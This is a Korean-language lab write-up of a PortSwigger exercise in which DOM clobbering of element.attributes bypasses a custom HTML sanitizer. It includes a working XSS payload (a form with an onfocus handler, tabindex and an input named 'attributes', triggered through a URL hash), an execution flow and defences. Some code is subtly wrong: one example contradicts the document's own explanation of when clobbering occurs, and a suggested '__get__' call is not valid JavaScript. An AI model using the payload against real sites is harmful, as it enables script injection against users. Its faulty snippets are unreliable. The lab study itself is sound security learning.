# Lab: DOM clobbering to bypass HTML filters

## 개요

- **난이도**: Expert
- **주제**: DOM Clobbering — `element.attributes` 프로퍼티 덮어쓰기 / 커스텀 HTML 필터 우회
- **링크**: https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters

## 목표

페이지의 커스텀 HTML sanitizer 가 `element.attributes` 를 순회하며 위험한 속성을 제거하는 구조를 이용한다. `<form>` + `<input name="attributes">` 조합으로 `attributes` 프로퍼티 자체를 DOM Clobbering 하면, 필터가 속성을 감지하지 못해 `onfocus` 같은 이벤트 핸들러가 통과된다.

## 006 랩과의 차이

```
[006 랩 — 전역 변수 Clobbering]
  window.defaultAvatar 같은 JS 전역 변수를 덮어씀
  → 페이지 JS 가 잘못된 값을 사용하게 유도

[007 랩 (이번) — attributes 프로퍼티 Clobbering]
  HTMLElement 의 .attributes 프로퍼티 자체를 덮어씀
  → 커스텀 HTML 필터가 속성 목록을 읽지 못하게 만듦
  → 위험한 속성이 필터를 통과
```

## `element.attributes` Clobbering 원리

### 정상 동작

```javascript
// 일반 요소의 .attributes
const form = document.querySelector('form');
form.attributes;
// → NamedNodeMap (속성들의 컬렉션)
// → 필터가 이것을 순회하며 위험 속성 확인
```

### DOM Clobbering 으로 덮어쓰기

```html
<form id="x" onfocus="alert(1)">
  <input name="attributes">
</form>
```

```javascript
// form 의 named property 접근:
document.getElementById('x').attributes
// → 정상이면 NamedNodeMap 반환
// → but name="attributes" 인 input 이 있으면
//   form[name] 접근이 .attributes 를 가로챔
//   → HTMLInputElement 반환! (NamedNodeMap 아님)

// 필터가 이것을 순회하려 하면:
for (let attr of element.attributes) { ... }
// → HTMLInputElement 는 NamedNodeMap 이 아님
// → 순회 실패 or 빈 결과
// → onfocus="alert(1)" 을 감지 못함 → 통과!
```

## 취약한 커스텀 필터 구조

```javascript
// 페이지의 커스텀 HTML sanitizer (취약한 구현)
function sanitize(html) {
    const div = document.createElement('div');
    div.innerHTML = html;

    for (const element of div.querySelectorAll('*')) {
        for (const attr of element.attributes) {  // ← Clobbering 대상!
            if (isBadAttribute(attr.name)) {
                element.removeAttribute(attr.name);
            }
        }
    }
    return div.innerHTML;
}

// element.attributes 가 Clobbered 된 경우:
//   for (const attr of HTMLInputElement) → 정상 순회 불가
//   → onfocus, onerror 등 이벤트 핸들러 속성 감지 못함
//   → 제거되지 않고 그대로 출력
```

## 공격 페이로드

### 댓글에 삽입하는 페이로드

```html
<form id="x" tabindex="0" onfocus="alert(1)">
  <input name="attributes">
</form>
```

### 자동 실행을 위한 anchor 추가

```html
<form id="x" tabindex="0" onfocus="alert(1)"><input name="attributes"></form>
<a href="#x">Focus me</a>
```

또는 URL 해시로 자동 포커스:

```
https://VULNERABLE.com/post?postId=X#x
→ 페이지 로드 시 id="x" 요소에 자동 포커스
→ onfocus="alert(1)" 실행
```

### 실행 흐름

```
1. 공격자: 댓글에 페이로드 삽입
   <form id="x" tabindex="0" onfocus="alert(1)"><input name="attributes"></form>

2. 커스텀 sanitizer 처리:
   element.attributes → HTMLInputElement (Clobbered)
   for (const attr of HTMLInputElement) → 순회 실패
   → onfocus="alert(1)" 감지 못함 → 그대로 출력

3. 피해자: 해당 페이지 방문
   URL 해시 #x → form 요소에 포커스
   onfocus 이벤트 발화 → alert(1) 실행
```

## 006 랩 vs 007 랩 종합 비교

| 항목 | 006 랩 | 007 랩 (이번) |
|------|--------|--------------|
| Clobbering 대상 | `window.defaultAvatar` (전역 변수) | `element.attributes` (DOM 프로퍼티) |
| 사용 요소 | `<a id> + <a id name href>` | `<form id> + <input name="attributes">` |
| 우회 대상 | DOMPurify (`cid:` + `&quot;`) | 커스텀 HTML 필터 |
| 트리거 방법 | innerHTML 삽입 시 자동 | `onfocus` + tabindex + URL 해시 |
| XSS 경로 | img onerror | form onfocus |

## 핵심 정리

- `<form>` 안에 `<input name="attributes">` 를 넣으면 `form.attributes` 가 NamedNodeMap 대신 HTMLInputElement 를 반환한다.
- 커스텀 HTML 필터가 `element.attributes` 를 순회할 때 이 Clobbering 때문에 속성 감지에 실패한다.
- `tabindex` 속성으로 비대화형 요소에도 포커스를 부여하고, URL 해시(`#id`)로 자동 포커스를 트리거할 수 있다.
- **방어**:
  - `element.attributes` 대신 `Element.prototype.attributes` (원본 프로토타입) 를 직접 참조
  - DOMPurify 같은 검증된 라이브러리 사용 (커스텀 sanitizer 지양)
  - `<form>`, `<input>` 의 `id`/`name` 속성 제거로 DOM Clobbering 자체 차단

## 배운 점 및 추가 학습

### 1. Named Property 접근과 Clobbering

```javascript
// HTML named property 우선순위:
// form[name] 접근은 form 내부의 name 속성 요소를 반환

const form = document.createElement('form');
form.innerHTML = '<input name="attributes">';
document.body.appendChild(form);

form.attributes;
// NamedNodeMap {length: 0} ← 정상 (속성 없음)

const form2 = document.createElement('form');
form2.setAttribute('onfocus', 'alert(1)');
form2.innerHTML = '<input name="attributes">';
document.body.appendChild(form2);

form2.attributes;
// → HTMLInputElement (input[name=attributes])
// → NamedNodeMap 이 아님! Clobbered!
```

### 2. Prototype 을 통한 안전한 속성 접근

```javascript
// 취약한 방법 (Clobbering 에 취약):
element.attributes

// 안전한 방법 (Prototype 직접 참조):
Object.getOwnPropertyDescriptor(Element.prototype, 'attributes')
    .get.call(element)
// → 항상 실제 NamedNodeMap 반환
// → DOM Clobbering 영향 없음

// 또는:
Element.prototype.attributes.__get__(element)
```

### 3. tabindex 와 포커스 공격

```html
<!-- tabindex 속성 -->
<div tabindex="0">      ← 포커스 가능하게 됨 (기본은 불가)
<form tabindex="0">     ← 포커스 가능
<span tabindex="-1">    ← JS 로만 포커스 가능 (Tab 키 불가)

<!-- URL 해시로 자동 포커스 -->
https://example.com/page#targetId
→ 페이지 로드 시 id="targetId" 요소로 스크롤 + 포커스

<!-- onfocus 이벤트 -->
<form tabindex="0" onfocus="alert(1)">
→ 포커스 시 alert 실행
→ URL 해시로 자동 트리거 가능
```

### 4. DOM Clobbering 방어 전략 종합

```javascript
// 1. 커스텀 sanitizer 에서 안전한 속성 접근
function safeGetAttributes(element) {
    // Prototype 통해 직접 접근 → Clobbering 불가
    return Object.getOwnPropertyDescriptor(
        Element.prototype, 'attributes'
    ).get.call(element);
}

// 2. id, name 속성 자체를 필터링
function sanitize(html) {
    // ...
    // id, name 속성 제거로 DOM Clobbering 원천 차단
    element.removeAttribute('id');
    element.removeAttribute('name');
}

// 3. DOMPurify + SANITIZE_DOM 옵션
DOMPurify.sanitize(html, {
    SANITIZE_DOM: true  // DOM Clobbering 방지 옵션
});
// → id, name 으로 인한 Clobbering 위험 요소 제거

// 4. 전역 변수 보호
Object.freeze(window.myConfig);
// → Clobbering 으로 덮어쓰기 불가
```
